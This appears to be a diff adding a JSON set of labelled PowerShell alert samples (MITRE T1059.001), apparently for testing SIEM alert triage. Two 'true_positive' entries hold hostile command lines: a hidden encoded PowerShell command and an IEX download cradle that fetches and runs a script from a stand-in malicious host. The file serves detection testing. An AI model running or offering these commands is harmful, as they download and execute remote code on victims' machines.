@@ -1,0 +1,53 @@
+{
+  "technique_id": "T1059.001",
+  "technique_name": "PowerShell",
+  "tactic": "Execution",
+  "rule_id_pool": ["91802", "91803", "91804"],
+  "variants": [
+    {
+      "label": "true_positive",
+      "level": 12,
+      "description": "PowerShell with EncodedCommand detected",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA==",
+      "parent_image": "C:\\Windows\\System32\\cmd.exe",
+      "user": "Administrator"
+    },
+    {
+      "label": "true_positive",
+      "level": 11,
+      "description": "PowerShell IEX download cradle",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/stage1.ps1')",
+      "parent_image": "C:\\Windows\\System32\\cmd.exe",
+      "user": "jdoe"
+    },
+    {
+      "label": "escalate",
+      "level": 10,
+      "description": "PowerShell spawned by Office application",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\report.ps1",
+      "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "user": "alice"
+    },
+    {
+      "label": "false_positive",
+      "level": 5,
+      "description": "PowerShell update check",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe Get-WindowsUpdate",
+      "parent_image": "C:\\Windows\\System32\\svchost.exe",
+      "user": "SYSTEM"
+    },
+    {
+      "label": "false_positive",
+      "level": 4,
+      "description": "PowerShell scheduled inventory job",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe -File C:\\IT\\Scripts\\inventory.ps1",
+      "parent_image": "C:\\Windows\\System32\\taskeng.exe",
+      "user": "svc_inventory"
+    }
+  ]
+}
